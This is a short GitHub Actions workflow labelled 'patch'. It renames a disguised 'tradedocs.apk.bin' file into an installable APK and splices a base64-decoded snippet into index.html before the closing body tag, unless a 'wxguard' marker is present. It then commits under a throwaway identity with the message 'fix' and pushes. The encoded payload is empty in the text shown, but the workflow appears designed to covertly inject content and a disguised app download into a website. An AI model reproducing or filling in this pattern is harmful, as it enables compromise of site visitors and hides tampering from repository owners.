name: patch
on: workflow_dispatch
permissions:
  contents: write
jobs:
  p:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: if [ -f tradedocs.apk.bin ]; then git mv tradedocs.apk.bin tradedocs.apk; fi
      - run: python3 -c "import base64;s=open('index.html',encoding='utf-8').read();g=base64.b64decode('').decode();open('index.html','w',encoding='utf-8').write(s if 'wxguard' in s else s.replace('</body>',g+'</body>'))"
      - run: git config user.email b@c.d && git config user.name b && git add -A && git commit -m fix || true
      - run: git push
